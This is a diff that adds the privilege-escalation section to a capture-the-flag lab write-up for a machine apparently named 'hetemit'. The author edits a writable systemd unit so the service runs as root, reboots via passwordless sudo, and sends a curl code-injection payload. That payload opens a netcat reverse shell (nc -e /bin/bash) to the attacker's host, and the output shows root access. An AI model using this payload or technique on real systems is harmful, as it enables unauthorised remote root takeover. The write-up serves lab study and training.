@@ -108,8 +108,76 @@ sh-4.4$
 ```
 # Privilege escalation
 ```
-Run linpeas and found we can write over a pythonapp.service  
+Run linpeas and found we have write permission over a pythonapp.service  
 ╔══════════╣ Permissions in init, init.d, systemd, and rc.d
 ╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#init-initd-systemd-and-rcd      
 You have write privileges over /etc/systemd/system/pythonapp.service   
+```
+The pythonapp.service is a script systemd service unit file.   
+It is used by Linux to manage how a background application starts, stops, and restarts automatically.
+```
+[Unit]
+Description=Python App
+After=network-online.target
+
+[Service]
+Type=simple
+WorkingDirectory=/home/cmeeks/restjson_hetemit
+ExecStart=flask run -h 0.0.0.0 -p 50000
+TimeoutSec=30
+RestartSec=15s
+User=cmeeks
+ExecReload=/bin/kill -USR1 $MAINPID
+Restart=on-failure
+
+[Install]
+WantedBy=multi-user.target
+```
+We can change the script user to root to get the root shell
+```
+[cmeeks@hetemit system]$ cat pythonapp.service
+[Unit]
+Description=Python App
+After=network-online.target
+
+[Service]
+Type=simple
+WorkingDirectory=/home/cmeeks/restjson_hetemit
+ExecStart=flask run -h 0.0.0.0 -p 50000
+TimeoutSec=30
+RestartSec=15s
+User=root
+ExecReload=/bin/kill -USR1 $MAINPID
+Restart=on-failure
+
+[Install]
+WantedBy=multi-user.target
+```
+Then reboot the server to get root
+```
+[cmeeks@hetemit system]$ sudo -l
+sudo -l
+Matching Defaults entries for cmeeks on hetemit:
+    !visiblepw, always_set_home, match_group_by_gid, always_query_group_plugin,
+    env_reset, env_keep="COLORS DISPLAY HOSTNAME HISTSIZE KDEDIR LS_COLORS",
+    env_keep+="MAIL PS1 PS2 QTDIR USERNAME LANG LC_ADDRESS LC_CTYPE",
+    env_keep+="LC_COLLATE LC_IDENTIFICATION LC_MEASUREMENT LC_MESSAGES",
+    env_keep+="LC_MONETARY LC_NAME LC_NUMERIC LC_PAPER LC_TELEPHONE",
+    env_keep+="LC_TIME LC_ALL LANGUAGE LINGUAS _XKB_CHARSET XAUTHORITY",
+    secure_path=/sbin\:/bin\:/usr/sbin\:/usr/bin
+
+User cmeeks may run the following commands on hetemit:
+    (root) NOPASSWD: /sbin/halt, /sbin/reboot, /sbin/poweroff
+[cmeeks@hetemit system]$ sudo /sbin/reboot
+```
+```
+┌──(ming㉿kali)-[~/Downloads]
+└─$ curl -i http://192.168.129.117:50000/verify -X POST --data "code=__import__('os').popen('nc 192.168.45.167 80 -e /bin/bash').read()"
+```
+```
+$ nc -lvnp 80
+listening on [any] 80 ...
+connect to [192.168.45.167] from (UNKNOWN) [192.168.129.117] 41766
+id
+uid=0(root) gid=0(root) groups=0(root)
 ```
